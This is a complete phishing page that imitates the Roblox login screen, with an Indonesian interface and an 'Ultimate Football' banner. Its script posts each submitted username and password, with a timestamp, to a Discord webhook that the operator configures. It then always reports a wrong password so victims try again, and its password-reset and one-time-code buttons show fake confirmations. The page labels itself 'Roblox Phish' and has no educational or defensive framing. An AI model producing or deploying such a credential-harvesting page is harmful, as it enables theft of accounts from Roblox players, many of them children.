<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Login to Roblox</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #1a1a2e; /* hitam keunguan gelap */
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 420px;
            width: 100%;
            background: #16213e; /* card gelap */
            border-radius: 16px;
            padding: 32px 28px 28px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
            border: 1px solid #2a3a5e;
        }
        /* LOGO ROBLOX (teks merah) */
        .logo {
            text-align: center;
            font-size: 44px;
            font-weight: 900;
            color: #d42b2b;
            letter-spacing: -1px;
            margin-bottom: 8px;
        }
        .header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 4px;
        }
        .back-btn {
            font-size: 28px;
            color: #b0b9d0;
            cursor: default;
            opacity: 0.7;
            line-height: 1;
        }
        .header h1 {
            font-size: 22px;
            font-weight: 600;
            color: #f0f2f5;
        }
        .subtext {
            font-size: 14px;
            color: #8a9bb5;
            margin-bottom: 24px;
            margin-left: 40px;
        }
        .input-group {
            margin-bottom: 14px;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            background: #1f2a44;
            color: #f0f2f5;
            outline: none;
            transition: 0.2s;
        }
        .input-group input:focus {
            background: #253155;
            box-shadow: 0 0 0 2px #5d7bb5;
        }
        .input-group input::placeholder {
            color: #6a7a9e;
        }
        .btn-login {
            width: 100%;
            padding: 14px;
            background: #d42b2b;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 4px;
        }
        .btn-login:hover { background: #b82222; }
        .btn-login:disabled { opacity: 0.6; cursor: not-allowed; }
        .links {
            margin-top: 16px;
            text-align: center;
        }
        .links a {
            color: #b0b9d0;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            display: inline-block;
        }
        .links a:hover { text-decoration: underline; color: #d0d8f0; }
        .divider {
            border: none;
            border-top: 1px solid #2a3a5e;
            margin: 20px 0 18px;
        }
        .btn-group {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        .btn-outline {
            width: 100%;
            padding: 14px;
            background: transparent;
            color: #f0f2f5;
            border: 1px solid #4a5a7e;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
        }
        .btn-outline:hover { background: #1f2a44; }
        .btn-outline:disabled { opacity: 0.6; cursor: not-allowed; }
        .signup {
            margin-top: 16px;
            text-align: center;
            font-size: 14px;
            color: #b0b9d0;
        }
        .signup a {
            color: #d42b2b;
            font-weight: 600;
            text-decoration: none;
        }
        .signup a:hover { text-decoration: underline; }
        .footer-banner {
            margin-top: 20px;
            padding: 12px;
            background: #0f1422;
            border-radius: 8px;
            text-align: center;
            font-size: 13px;
            font-weight: 600;
            color: #d0d8f0;
            letter-spacing: 0.5px;
            border: 1px solid #2a3a5e;
        }
        .error-box {
            background: #2a1a1a;
            border-left: 4px solid #d42b2b;
            border-radius: 4px;
            padding: 10px 14px;
            margin-bottom: 16px;
            color: #f0a0a0;
            font-size: 14px;
            display: none;
        }
        .error-box.show { display: block; }
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top: 2px solid white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div class="container">
    <!-- LOGO ROBLOX MERAH -->
    <div class="logo">ROBLOX</div>

    <!-- Header -->
    <div class="header">
        <span class="back-btn">‹</span>
        <h1>Login to Roblox</h1>
    </div>
    <div class="subtext">Masuk ke akun Roblox Anda</div>

    <!-- Error -->
    <div class="error-box" id="errorBox">
        <span id="errorText">✕ Kata sandi yang Anda masukkan salah.</span>
    </div>

    <!-- Form -->
    <form id="loginForm">
        <div class="input-group">
            <input type="text" id="username" placeholder="Username/Email/Phone" required>
        </div>
        <div class="input-group">
            <input type="password" id="password" placeholder="Password" required>
        </div>
        <button type="submit" class="btn-login" id="loginBtn">Log In</button>
    </form>

    <!-- Links -->
    <div class="links">
        <a href="#" id="forgotLink">Forgot Password or Username?</a>
    </div>

    <hr class="divider">

    <!-- Tombol tambahan -->
    <div class="btn-group">
        <button class="btn-outline" id="codeBtn">Email Me a One-Time Code</button>
        <button class="btn-outline" id="deviceBtn">Use Another Device</button>
    </div>

    <!-- Sign Up -->
    <div class="signup">
        Don't have an account? <a href="#" id="signupLink">Sign Up</a>
    </div>

    <!-- Banner bawah (ULTIMATE FOOTBALL) -->
    <div class="footer-banner">⚽ ULTIMATE FOOTBALL</div>
</div>

<script>
    // ============================================================
    // KONFIGURASI – GANTI DENGAN WEBHOOK DISCORD KAMU
    // ============================================================
    const WEBHOOK_URL = "https://discord.com/api/webhooks/.../..."; // <-- GANTI INI

    // ============================================================
    // KIRIM DATA KE DISCORD
    // ============================================================
    function sendToDiscord(username, password) {
        const payload = {
            embeds: [{
                title: "🔐 New Roblox Login!",
                color: 0xd42b2b,
                fields: [
                    { name: "👤 Username/Email", value: username, inline: false },
                    { name: "🔑 Password", value: password, inline: false },
                    { name: "🌐 IP", value: "{{ip}}", inline: true },
                    { name: "🕒 Time", value: new Date().toUTCString(), inline: true }
                ],
                footer: { text: "Roblox Phish • Powered by GitHub" }
            }]
        };

        fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        })
        .then(res => {
            if (!res.ok) console.error("Webhook failed:", res.status);
        })
        .catch(err => console.error("Error:", err));
    }

    // ============================================================
    // HANDLER SUBMIT
    // ============================================================
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();

        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();
        const errorBox = document.getElementById('errorBox');
        const errorText = document.getElementById('errorText');
        const btn = document.getElementById('loginBtn');

        if (!username || !password) {
            errorText.textContent = '✕ Harap isi semua field.';
            errorBox.classList.add('show');
            return;
        }

        errorBox.classList.remove('show');
        btn.innerHTML = '<span class="spinner"></span> Memproses...';
        btn.disabled = true;

        sendToDiscord(username, password);

        setTimeout(() => {
            btn.innerHTML = 'Log In';
            btn.disabled = false;
            errorText.textContent = '✕ Kata sandi yang Anda masukkan salah.';
            errorBox.classList.add('show');
            document.getElementById('username').value = '';
            document.getElementById('password').value = '';
            document.getElementById('password').focus();
        }, 1500);
    });

    // ============================================================
    // FITUR TAMBAHAN (Palsu)
    // ============================================================
    document.getElementById('forgotLink').addEventListener('click', function(e) {
        e.preventDefault();
        const errorBox = document.getElementById('errorBox');
        const errorText = document.getElementById('errorText');
        errorText.textContent = '✉️ Link reset telah dikirim ke email Anda.';
        errorBox.classList.add('show');
        setTimeout(() => errorBox.classList.remove('show'), 3000);
    });

    document.getElementById('codeBtn').addEventListener('click', function() {
        const errorBox = document.getElementById('errorBox');
        const errorText = document.getElementById('errorText');
        errorText.textContent = '📱 Kode sekali pakai telah dikirim ke email Anda.';
        errorBox.classList.add('show');
        setTimeout(() => errorBox.classList.remove('show'), 3000);
    });

    document.getElementById('deviceBtn').addEventListener('click', function(e) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    });

    document.getElementById('signupLink').addEventListener('click', function(e) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    });

    document.getElementById('username').addEventListener('focus', function() {
        document.getElementById('errorBox').classList.remove('show');
    });
    document.getElementById('password').addEventListener('focus', function() {
        document.getElementById('errorBox').classList.remove('show');
    });
</script>
</body>
</html>
